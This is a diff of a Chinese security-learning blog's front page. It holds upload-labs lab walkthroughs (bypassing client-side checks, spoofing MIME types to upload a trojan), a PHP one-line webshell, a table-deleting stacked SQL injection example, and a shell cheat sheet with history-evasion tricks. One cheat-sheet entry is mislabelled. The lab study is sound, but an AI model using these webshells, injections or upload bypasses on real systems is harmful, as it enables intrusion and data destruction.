@@ -1,331 +1,1331 @@
-<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Dokiy</title><meta name="author" content="aurora"><meta name="copyright" content="aurora"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Dokiy</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
 <meta property="og:title" content="Dokiy">
 <meta property="og:url" content="https://dokidokiy.github.io/index.html">
 <meta property="og:site_name" content="Dokiy">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="aurora">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dokidokiy.github.io/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: 'Copy successfully',
-    error: 'Copy error',
-    noSupport: 'The browser does not support'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: 'Just',
-    min: 'minutes ago',
-    hour: 'hours ago',
-    day: 'days ago',
-    month: 'months ago'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  source: {
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
-    }
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'Dokiy',
-  isPost: false,
-  isHome: true,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2023-06-22 14:31:25'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
-
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-    win.saveToLocal = {
-      set: function setWithExpiry(key, value, ttl) {
-        if (ttl === 0) return
-        const now = new Date()
-        const expiryDay = ttl * 86400000
-        const item = {
-          value: value,
-          expiry: now.getTime() + expiryDay,
-        }
-        localStorage.setItem(key, JSON.stringify(item))
-      },
-
-      get: function getWithExpiry(key) {
-        const itemStr = localStorage.getItem(key)
-
-        if (!itemStr) {
-          return undefined
-        }
-        const item = JSON.parse(itemStr)
-        const now = new Date()
-
-        if (now.getTime() > item.expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return item.value
-      }
-    }
   
-    win.getScript = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script')
-      script.src = url
-      script.async = true
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    })
+    <link rel="alternate" href="/atom.xml" title="Dokiy" type="application/atom+xml">
   
-    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
-      const link = document.createElement('link')
-      link.rel = 'stylesheet'
-      link.href = url
-      if (id) link.id = id
-      link.onerror = reject
-      link.onload = link.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        link.onload = link.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(link)
-    })
   
-      win.activateDarkMode = function () {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = function () {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-          if (t === 'dark') activateDarkMode()
-          else if (t === 'light') activateLightMode()
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Dokiy</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
         
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://DokiDokiy.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-1.命令格式和基础命令" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/22/1.%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" class="article-date">
+  <time datetime="2023-06-22T09:32:44.299Z" itemprop="datePublished">2023-06-22</time>
+</a>
     
-    const detectApple = () => {
-      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Dokiy"><span class="site-name">Dokiy</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Dokiy</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/" title="upload-labs靶场">upload-labs靶场</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-22T15:51:37.000Z" title="Created 2023-05-22 23:51:37">2023-05-22</time></span></div><div class="content">
-pass-01(js验证)上传木马后
-提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-命令格式和基础命令"><a href="#1-命令格式和基础命令" class="headerlink" title="1.命令格式和基础命令"></a>1.命令格式和基础命令</h2><p>Linux命令是用于实现某一类功能的指令或程序，其命令的执行依赖于解释器程序，如/bin/bash。</p>
+<ul>
+<li><strong>内部命令：</strong>安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。</li>
+<li><strong>外部命令：</strong>安装Web应用程序产生的命令，大部分是对安装程序进行操作的。</li>
+</ul>
+<p>Linux命令的通用格式为：</p>
+<pre><code class="text">命令关键字 [选项] [参数]
+选项及参数含义：
+    - 选项：用于调节命令的具体功能
+    - 以“-”引导短格式选项（单个字符），比如“-l”
+    - 以“--”引导长格式选项（多个字符），比如“--color”
+    - 多个段格式选项可以写在一起，用一个“-”引导，比如“-al”
+参数：命令操作的对象，如文件、目录名等
+</code></pre>
+<p>举个例子，“ls -al /home”查看home目录信息。</p>
 
-分析一下代码这里我们跳过弹窗的提示，可以看出来这个验证是前端进行的，
-
-从标记的代码中可以看出，使用了onsubmit这个函数，触发了文件提交事件，在表单提交后马上调用了return checkFile 这个函数对上传进行了检查。
-绕过方式第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。
-把onsubmit这个函数删掉，
-把script代码也删掉
-
- 在form表单中添加第一关的提交地址
-
-第二种：直接按F12 把onsubmit这个直接删除掉
-不推荐第二种，因为如果是在浏览器查看器中直接删除的话，可能他还有一些正常的js，
-如果把正常的js给删除掉的话，可能正常的js会影响到上传操作。
-pass-02(后端验证) 文件类型校验 (MIME校验)上传木马后
-提示：本pass在服务端对数据包的MIME进行检查。
-
-分析代码：
-从源码中可以看出只对文件类型(type) 进行验证，必须是image/jpeg或 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-21T13:30:40.000Z" title="Created 2023-05-21 21:30:40">2023-05-21</time></span></div><div class="content">websell什么叫做webshell？1.webshell,简称为网页后门。简单来说它是运行在web应用之上的远程控制程序。
-2.webshell是一张网页，由PHP，JSP,ASP,NET等这类web应用开发程序语言开发，但webshell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。
-常见的webshell有哪些？1.大马、小马、一句话木马、菜刀马、脱库马、各种马…等
-2，拥有较完整功能的webshell，我们一般称为大马
-3.功能相对简单的webshell成为小马
-webshell有什么作用？怎样能获取getshell？webshell之php一句话木马解读1&lt;?php @eval($_post[x]);?&gt;
-
-$_post[x]:获取post请求参数中x的值。例如post请求中传递x=phpinfo(); , 那么$_post[x]就等同于
-phpinfo(); 
-eval()将字符串当做PHP代码运行。例如eval(’phpinfo();’) , 其中phpinfo();会被当做PHP代码去执行。 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/" title="宽字节注入">宽字节注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-17T15:44:46.000Z" title="Created 2023-05-17 23:44:46">2023-05-17</time></span></div><div class="content">宽字节注入原理宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过sql注入防御。
-常见的字符集ascii编码：单字节编码
-0x00 null0x200x21 !0x22 “0x23 #0x24 $0x25 %0x26 &amp;0x27 ’0x28 (0x29)0x2A *0x2B +0x2C ,0x2D -0x2E .0x2F /0x3A :0x3B ;0x3C &lt;0x3D =0x3E &gt;0x3F ?0x40 @0x5B [0x5C0x5D ]0x5E ^0x5F _0x60 `0x7B {0x7C |0x7D }0x7E ~
-latin1编码：单字节编码
-gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和ascii保持一致。双字节的第一个字节范围是0x81-0xFE
-utf-8编码：使用一至四字节编码，0x00-0x7F范围内是一位，和ascii保持一致。其他字符用二至四个字节变长表示。
-MySQL字符转换数据提交到mysql数据库，需要进行字符集的转换，使得mysql数据库可以对数据进行处理， ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" title="堆叠注入">堆叠注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-05-16T11:54:24.000Z" title="Created 2023-05-16 19:54:24">2023-05-16</time></span></div><div class="content">堆叠注入原理mysql数据库sql语句的默认结尾是以 ; 结尾，在执行多条sql语句时要使用结束符隔开，那么在 ；结束一条sql语句后继续构造下一条语句会不会一起执行？因此这个想法就造成了堆叠注入。
-而union injection(联合注入)也是将两条语句合并在一起，两者有什么区别嘛？
-区别就在于union或者union all 执行的语句类型有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。
-123用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/06/22/1.%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%92%8C%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="cljwyeab70001y0vgec166u7e" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
+  
+    <article id="post-shell常用命令" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-date">
+  <time datetime="2023-06-22T06:46:50.320Z" itemprop="datePublished">2023-06-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="shell常用命令"><a href="#shell常用命令" class="headerlink" title="shell常用命令"></a>shell常用命令</h1><p><strong>前言</strong></p>
+<p>使用Linux  shell是一些程序员每天的基本工作，但我们经常会忘记一些有用的shell命令和技巧。当然，命令我能记住，但我不敢说能记得如何用它执行某个特定任务。需要注意一点的是，有些用法需要在你的Linux系统里安装额外的软件。下面话不多说了，来看看详细的内容吧。</p>
+<p><strong>检查远程端口是否对bash开放：</strong></p>
+<pre><code class="text">echo &gt;/dev/tcp/8.8.8.8/53 &amp;&amp; echo &quot;open&quot;
+</code></pre>
+<p><strong>让进程转入后台：</strong></p>
+<pre><code class="text">Ctrl + z
+</code></pre>
+<p><strong>产生随机的十六进制数，其中n是字符数：</strong></p>
+<pre><code class="text">openssl rand -hex n
+</code></pre>
+<p><strong>在当前shell里执行一个文件里的命令：</strong></p>
+<pre><code class="text">source /home/user/file.name
+</code></pre>
+<p><strong>截取前5个字符：</strong></p>
+<pre><code class="text">$&#123;variable:0:5&#125;
+</code></pre>
+<p><strong>SSH debug 模式:</strong></p>
+<pre><code class="text">ssh -vvv user@ip_address
+</code></pre>
+<p><strong>SSH with pem key:</strong></p>
+<pre><code class="text">ssh user@ip_address -i key.pem
+</code></pre>
+<p><strong>用wget抓取完整的网站目录结构，存放到本地目录中：</strong></p>
+<pre><code class="text">wget -r --no-parent --reject &quot;index.html*&quot; http://hostname/ -P /home/user/dirs
+</code></pre>
+<p><strong>一次创建多个目录：</strong></p>
+<pre><code class="text">mkdir -p /home/user/&#123;test,test1,test2&#125;
+</code></pre>
+<p><strong>列出包括子进程的进程树：</strong></p>
+<pre><code class="text">ps axwef
+</code></pre>
+<p><strong>创建 war 文件:</strong></p>
+<pre><code class="text">jar -cvf name.war file
+</code></pre>
+<p><strong>测试硬盘写入速度：</strong></p>
+<pre><code class="text">dd if=/dev/zero of=/tmp/output.img bs=8k count=256k; rm -rf /tmp/output.img
+</code></pre>
+<p><strong>测试硬盘读取速度：</strong></p>
+<pre><code class="text">hdparm -Tt /dev/sda
+</code></pre>
+<p><strong>获取文本的md5 hash：</strong></p>
+<pre><code class="text">echo -n &quot;text&quot; | md5sum
+</code></pre>
+<p><strong>检查xml格式：</strong></p>
+<pre><code class="text">xmllint --noout file.xml
+</code></pre>
+<p><strong>将tar.gz提取到新目录里：</strong></p>
+<pre><code class="text">tar zxvf package.tar.gz -C new_dir
+</code></pre>
+<p><strong>使用curl获取HTTP头信息：</strong></p>
+<pre><code class="text">curl -I http://www.example.com
+</code></pre>
+<p><strong>修改文件或目录的时间戳(YYMMDDhhmm):</strong></p>
+<pre><code class="text">touch -t 0712250000 file
+</code></pre>
+<p><strong>用wget命令执行ftp下载：</strong></p>
+<pre><code class="text">wget -m ftp://username:password@hostname
+</code></pre>
+<p><strong>生成随机密码(例子里是16个字符长):</strong></p>
+<pre><code class="text">LANG=c &lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c$&#123;1:-16&#125;;echo;
+</code></pre>
+<p><strong>快速备份一个文件：</strong></p>
+<pre><code class="text">cp some_file_name&#123;,.bkp&#125;
+</code></pre>
+<p><strong>访问Windows共享目录：</strong></p>
+<pre><code class="text">smbclient -U &quot;DOMAIN\user&quot; //dc.domain.com/share/test/dir
+</code></pre>
+<p><strong>执行历史记录里的命令(这里是第100行):</strong></p>
+<pre><code class="text">!100
+</code></pre>
+<p><strong>解压:</strong></p>
+<pre><code class="text">unzip package_name.zip -d dir_name
+</code></pre>
+<p><strong>输入多行文字(CTRL + d 退出):</strong></p>
+<pre><code class="text">cat &gt; test.txt
+</code></pre>
+<p><strong>创建空文件或清空一个现有文件：</strong></p>
+<pre><code class="text">\&gt; test.txt
+</code></pre>
+<p><strong>与Ubuntu NTP server同步时间：</strong></p>
+<pre><code class="text">ntpdate ntp.ubuntu.com
+</code></pre>
+<p><strong>用netstat显示所有tcp4监听端口：</strong></p>
+<pre><code class="text">netstat -lnt4 | awk &#39;&#123;print $4&#125;&#39; | cut -f2 -d: | grep -o &#39;[0-9]*&#39;
+</code></pre>
+<p><strong>qcow2镜像文件转换：</strong></p>
+<pre><code class="text">qemu-img convert -f qcow2 -O raw precise-server-cloudimg-amd64-disk1.img \precise-server-cloudimg-amd64-disk1.raw
+</code></pre>
+<p><strong>重复运行文件，显示其输出（缺省是2秒一次）：</strong></p>
+<pre><code class="text">watch ps -ef
+</code></pre>
+<p><strong>所有用户列表：</strong></p>
+<pre><code class="text">getent passwd
+</code></pre>
+<p><strong>Mount root in read/write mode:</strong></p>
+<pre><code class="text">mount -o remount,rw /
+</code></pre>
+<p><strong>挂载一个目录（这是不能使用链接的情况）:</strong></p>
+<pre><code class="text">mount --bind /source /destination
+</code></pre>
+<p><strong>动态更新DNS server:</strong></p>
+<pre><code class="text">nsupdate &lt; &lt;EOF update add $HOST 86400 A $IP send EOF
+</code></pre>
+<p><strong>递归grep所有目录：</strong></p>
+<pre><code class="text">grep -r &quot;some_text&quot; /path/to/dir
+</code></pre>
+<p><strong>列出前10个最大的文件：</strong></p>
+<pre><code class="text">lsof / | awk &#39;&#123; if($7 &gt; 1048576) print $7/1048576 &quot;MB &quot;$9 &#125;&#39; | sort -n -u | tail
+</code></pre>
+<p><strong>显示剩余内存(MB):</strong></p>
+<pre><code class="text">free -m | grep cache | awk &#39;/[0-9]/&#123; print $4&quot; MB&quot; &#125;&#39;
+</code></pre>
+<p><strong>打开Vim并跳到文件末：</strong></p>
+<pre><code class="text">vim + some_file_name
+</code></pre>
+<p><strong>Git 克隆指定分支(master):</strong></p>
+<pre><code class="text">git clone git@github.com:name/app.git -b master
+</code></pre>
+<p><strong>Git 切换到其它分支(develop):</strong></p>
+<pre><code class="text">git checkout develop
+</code></pre>
+<p><strong>Git 删除分支(myfeature):</strong></p>
+<pre><code class="text">git clone git@github.com:name/app.git -b master
+</code></pre>
+<p><strong>Git 切换到其它分支(develop):</strong></p>
+<pre><code class="text">git checkout develop
+</code></pre>
+<p><strong>Git 删除分支(myfeature):</strong></p>
+<pre><code class="text">git branch -d myfeature
+</code></pre>
+<p><strong>Git 删除远程分支</strong></p>
+<pre><code class="text">git push origin :branchName
+</code></pre>
+<p><strong>Git 将新分支推送到远程服务器：</strong></p>
+<pre><code class="text">git push -u origin mynewfeature
+</code></pre>
+<p><strong>打印历史记录中最后一次cat命令：</strong></p>
+<pre><code class="text">!cat:p
+</code></pre>
+<p><strong>运行历史记录里最后一次cat命令：</strong></p>
+<pre><code class="text">!cat
+</code></pre>
+<p><strong>找出/home/user下所有空子目录:</strong></p>
+<pre><code class="text">find /home/user -maxdepth 1 -type d -empty
+</code></pre>
+<p><strong>获取test.txt文件中第50-60行内容：</strong></p>
+<pre><code class="text">&lt; test.txt sed -n &#39;50,60p&#39;
+</code></pre>
+<p><strong>运行最后一个命令(如果最后一个命令是mkdir /root/test, 下面将会运行: sudo mkdir /root/test)：</strong></p>
+<pre><code class="text">sudo !!
+</code></pre>
+<p><strong>创建临时RAM文件系统 – ramdisk (先创建/tmpram目录):</strong></p>
+<pre><code class="text">mount -t tmpfs tmpfs /tmpram -o size=512m
+</code></pre>
+<p><strong>Grep whole words:</strong></p>
+<pre><code class="text">grep -w &quot;name&quot; test.txt
+</code></pre>
+<p><strong>在需要提升权限的情况下往一个文件里追加文本：</strong></p>
+<pre><code class="text">echo &quot;some text&quot; | sudo tee -a /path/file
+</code></pre>
+<p><strong>列出所有kill signal参数:</strong></p>
+<pre><code class="text">kill -l
+</code></pre>
+<p><strong>在bash历史记录里禁止记录最后一次会话：</strong></p>
+<pre><code class="text">kill -9 $$
+</code></pre>
+<p><strong>扫描网络寻找开放的端口：</strong></p>
+<pre><code class="text">nmap -p 8081 172.20.0.0/16
+</code></pre>
+<p><strong>设置git email:</strong></p>
+<pre><code class="text">git config --globaluser.email &quot;me@example.com&quot; 
+</code></pre>
+<p><strong>To sync with master if you have unpublished commits:</strong></p>
+<pre><code class="text">git pull --rebase origin master
+</code></pre>
+<p><strong>将所有文件名中含有”txt”的文件移入/home/user目录:</strong></p>
+<pre><code class="text">find -iname &quot;*txt*&quot; -exec mv -v &#123;&#125; /home/user \;
+</code></pre>
+<p><strong>将文件按行并列显示：</strong></p>
+<pre><code class="text">paste test.txt test1.txt
+</code></pre>
+<p><strong>shell里的进度条:</strong></p>
+<pre><code class="text">pv data.log
+</code></pre>
+<p><strong>使用netcat将数据发送到Graphite server:</strong></p>
+<pre><code class="text">echo &quot;hosts.sampleHost 10 `date +%s`&quot; | nc 192.168.200.2 3000
+</code></pre>
+<p><strong>将tabs转换成空格：</strong></p>
+<pre><code class="text">expand test.txt &gt; test1.txt
+</code></pre>
+<p><strong>Skip bash history:</strong></p>
+<pre><code class="text">&lt; space &gt;cmd
+</code></pre>
+<p><strong>去之前的工作目录：</strong></p>
+<pre><code class="text">cd -
+</code></pre>
+<p><strong>拆分大体积的tar.gz文件(每个100MB)，然后合并回去：</strong></p>
+<pre><code class="text">split –b 100m /path/to/large/archive /path/to/output/files cat files* &gt; archive
+</code></pre>
+<p><strong>使用curl获取HTTP status code:</strong></p>
+<pre><code class="text">curl -sL -w &quot;%&#123;http_code&#125;\\n&quot; www.example.com -o /dev/null
+</code></pre>
+<p><strong>设置root密码，强化MySQL安全安装:</strong></p>
+<pre><code class="text">/usr/bin/mysql_secure_installation
+</code></pre>
+<p><strong>当Ctrl + c不好使时:</strong></p>
+<pre><code class="text">Ctrl + \
+</code></pre>
+<p><strong>获取文件owner:</strong></p>
+<pre><code class="text">stat -c %U file.txt
+</code></pre>
+<p><strong>block设备列表：</strong></p>
+<pre><code class="text">lsblk -f
+</code></pre>
+<p><strong>找出文件名结尾有空格的文件：</strong></p>
+<pre><code class="text">find . -type f -exec egrep -l &quot; +$&quot; &#123;&#125; \;
+</code></pre>
+<p><strong>找出文件名有tab缩进符的文件</strong></p>
+<pre><code class="text">find . -type f -exec egrep -l $&#39;\t&#39; &#123;&#125; \;
+</code></pre>
+<p><strong>用”=”打印出横线:全选复制放进笔记</strong></p>
+<pre><code class="text">printf &#39;%100s\n&#39; | tr &#39; &#39; =
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dokidokiy.github.io/2023/06/22/shell%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" data-id="cljwyeaba0003y0vg965pa5dl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-upload-labs靶场" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/" class="article-date">
+  <time datetime="2023-05-22T15:51:37.000Z" itemprop="datePublished">2023-05-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/">upload-labs靶场</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230602092842788.png" alt="image-20230602092842788"></p>
+<h2 id="pass-01-js验证"><a href="#pass-01-js验证" class="headerlink" title="pass-01(js验证)"></a>pass-01(js验证)</h2><p>上传木马后</p>
+<p>提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232014129.png" alt="image-20230523232014129"></p>
+<h4 id="分析一下代码"><a href="#分析一下代码" class="headerlink" title="分析一下代码"></a>分析一下代码</h4><p>这里我们跳过弹窗的提示，可以看出来这个验证是前端进行的，</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232753987.png" alt="image-20230523232753987"></p>
+<p>从标记的代码中可以看出，使用了onsubmit这个函数，触发了文件提交事件，在表单提交后马上调用了return checkFile 这个函数对上传进行了检查。</p>
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><h5 id="第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。"><a href="#第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。" class="headerlink" title="第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。"></a>第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。</h5><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523234905931.png" alt="image-20230523234905931"></p>
+<p>把onsubmit这个函数删掉，</p>
+<p>把script代码也删掉</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235125426.png" alt="image-20230523235125426"></p>
+<p> 在form表单中添加第一关的提交地址</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235402326.png" alt="image-20230523235402326"></p>
+<h5 id="第二种：直接按F12-把onsubmit这个直接删除掉"><a href="#第二种：直接按F12-把onsubmit这个直接删除掉" class="headerlink" title="第二种：直接按F12 把onsubmit这个直接删除掉"></a>第二种：直接按F12 把onsubmit这个直接删除掉</h5><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235950881.png" alt="image-20230523235950881"></p>
+<p>不推荐第二种，因为如果是在浏览器查看器中直接删除的话，可能他还有一些正常的js，</p>
+<p>如果把正常的js给删除掉的话，可能正常的js会影响到上传操作。</p>
+<h2 id="pass-02-后端验证-文件类型校验-MIME校验"><a href="#pass-02-后端验证-文件类型校验-MIME校验" class="headerlink" title="pass-02(后端验证) 文件类型校验 (MIME校验)"></a>pass-02(后端验证) 文件类型校验 (MIME校验)</h2><p>上传木马后</p>
+<p>提示：本pass在服务端对数据包的MIME进行检查。</p>
+<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230528133234181.png" alt="image-20230528133234181"></p>
+<p>分析代码：</p>
+<p>从源码中可以看出只对文件类型(type) 进行验证，必须是image/jpeg或者image/png 或者image/gif的格式，没有对后缀名进行验证，</p>
+<p>只需要bp抓包将Content-Type:的参数修改成image/jpeg 或者image/png 或者image/gif其中的一种，进行绕过就好。</p>
+<p>操作步骤：</p>
+<p>开始bp抓包，修改content-type类型即可</p>
